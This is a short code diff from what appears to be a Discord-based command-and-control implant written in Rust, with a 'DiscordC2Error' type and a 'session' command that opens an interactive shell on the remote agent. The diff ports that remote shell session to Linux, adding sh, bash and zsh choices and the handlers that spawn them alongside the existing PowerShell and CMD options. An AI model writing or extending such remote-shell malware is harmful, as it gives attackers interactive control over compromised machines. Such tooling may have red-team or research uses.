@@ -31,6 +31,7 @@ lazy_static! {
     pub static ref SHELL_TYPE: Mutex<Option<ShellType>> = Mutex::new(None);
 }
 
+#[cfg(target_os = "windows")]
 /// Registers the "session" application command with the provided `CreateApplicationCommand` builder. This command
 /// allows users to open an interactive command session with the agent, using either PowerShell or CMD.
 ///
@@ -68,6 +69,24 @@ pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicatio
                 .description("The type of interactive session to open.")
                 .add_string_choice("powershell.exe", "powershell")
                 .add_string_choice("cmd.exe", "cmd")
+                .required(true)
+        })
+}
+
+#[cfg(target_os = "linux")]
+pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
+    // Register the session command
+    command
+        .name("session")
+        .description("Open up an interactive command session with the agent.")
+        .create_option(|option| {
+            option
+                .name("session-type")
+                .kind(CommandOptionType::String)
+                .description("The type of interactive session to open.")
+                .add_string_choice("Sh (may be symlinked to /bin/bash on some distros)", "sh")
+                .add_string_choice("Bash", "bash")
+                .add_string_choice("Zsh", "zsh")
                 .required(true)
         })
 }
@@ -191,6 +210,18 @@ pub async fn run(
             "cmd" => {
                 ProcessHandler::instance(&ShellType::Cmd).await?;
                 (string.as_str(), ShellType::Cmd)
+            }
+            "sh" => {
+                ProcessHandler::instance(&ShellType::Sh).await?;
+                (string.as_str(), ShellType::Sh)
+            }
+            "bash" => {
+                ProcessHandler::instance(&ShellType::Bash).await?;
+                (string.as_str(), ShellType::Bash)
+            }
+            "zsh" => {
+                ProcessHandler::instance(&ShellType::Zsh).await?;
+                (string.as_str(), ShellType::Zsh)
             }
             _ => return Err(DiscordC2Error::InvalidShellType),
         };
